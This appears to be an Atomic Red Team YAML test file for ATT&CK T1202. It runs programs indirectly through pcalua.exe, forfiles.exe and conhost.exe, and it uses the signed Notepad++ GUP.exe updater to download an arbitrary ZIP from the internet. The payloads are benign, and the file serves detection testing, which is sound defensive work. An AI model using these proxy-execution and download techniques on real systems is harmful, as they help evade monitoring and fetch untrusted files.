attack_technique: T1202
display_name: Indirect Command Execution
atomic_tests:
- name: Indirect Command Execution - pcalua.exe
  auto_generated_guid: cecfea7a-5f03-4cdd-8bc8-6f7c22862440
  description: |
    The Program Compatibility Assistant (pcalua.exe) may invoke the execution of programs and commands from a Command-Line Interface.
    [Reference](https://twitter.com/KyleHanslovan/status/912659279806640128)
    Upon execution, calc.exe should open
  supported_platforms:
  - windows
  input_arguments:
    payload_path:
      description: Path to payload
      type: path
      default: C:\Windows\System32\calc.exe
    process:
      description: Process to execute
      type: string
      default: calc.exe
  executor:
    command: |
      pcalua.exe -a #{process}
      pcalua.exe -a #{payload_path}
    name: command_prompt
- name: Indirect Command Execution - forfiles.exe
  auto_generated_guid: 8b34a448-40d9-4fc3-a8c8-4bb286faf7dc
  description: |
    forfiles.exe may invoke the execution of programs and commands from a Command-Line Interface.
    [Reference](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Forfiles.yml)
    "This is basically saying for each occurrence of notepad.exe in c:\windows\system32 run calc.exe"
    Upon execution calc.exe will be opened.
  supported_platforms:
  - windows
  input_arguments:
    process:
      description: Process to execute
      type: string
      default: calc.exe
  executor:
    command: |
      forfiles /p c:\windows\system32 /m notepad.exe /c #{process}
    name: command_prompt
- name: Indirect Command Execution - conhost.exe
  auto_generated_guid: cf3391e0-b482-4b02-87fc-ca8362269b29
  description: |
    conhost.exe refers to a host process for the console window. It provide an interface between command prompt and Windows explorer.
    Executing it through command line can create process ancestry anomalies
    [Reference] (http://www.hexacorn.com/blog/2020/05/25/how-to-con-your-host/)
  supported_platforms:
  - windows
  input_arguments:
    process:
      description: Process to execute
      type: string
      default: notepad.exe
  executor:
    command: |
      conhost.exe "#{process}"
    name: command_prompt
- name: Arbitrary file download using the Notepad++ GUP.exe binary
  description: |-
    GUP is an open source signed binary used by Notepad++ for software updates, and can be used to download arbitrary files(.zip) from internet/github.
    [Reference](https://x.com/nas_bench/status/1535322182863179776?s=20)
    Upon execution, a sample zip file will be downloaded to C:\Temp\Sample folder
  supported_platforms:
  - windows
  input_arguments:
    target_file_url:
      description: 'URL of the target ZIP file (Eg: https://example.com/test.zip)'
      type: url
      default: https://getsamplefiles.com/download/zip/sample-1.zip
    working_dir:
      description: Mention the directory where GUP.exe & it's dependecies exists exists
      type: path
      default: PathToAtomicsFolder\T1202\bin\
    gup_executable:
      description: GUP is an open source signed binary used by Notepad++ for software updates
      type: String
      default: PathToAtomicsFolder\T1202\bin\GUP.exe
    target_file_sha256:
      description: SHA256 value of target ZIP file
      type: string
      default: AACC269929EB3813429F4D15FB45ADE9C7D0276B55421817F052A3ECB366B2E6
  dependency_executor_name: powershell
  dependencies:
  - description: Gup.exe binary must exist on disk at specified location (#{gup_executable})
    prereq_command: if (Test-Path "#{gup_executable}") {exit 0} else {exit 1}
    get_prereq_command: |-
      New-Item -Type Directory (split-path "#{gup_executable}") -ErrorAction ignore | Out-Null
      Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1202/src/GUP.exe" -OutFile "#{gup_executable}"
  executor:
    command: |-
      cd #{working_dir}
      GUP.exe -unzipTo "" "C:\Temp" "Sample #{target_file_url} #{target_file_sha256}"
    cleanup_command: rmdir /s /q "C:\Temp\Sample"
    name: command_prompt
    elevation_required: true
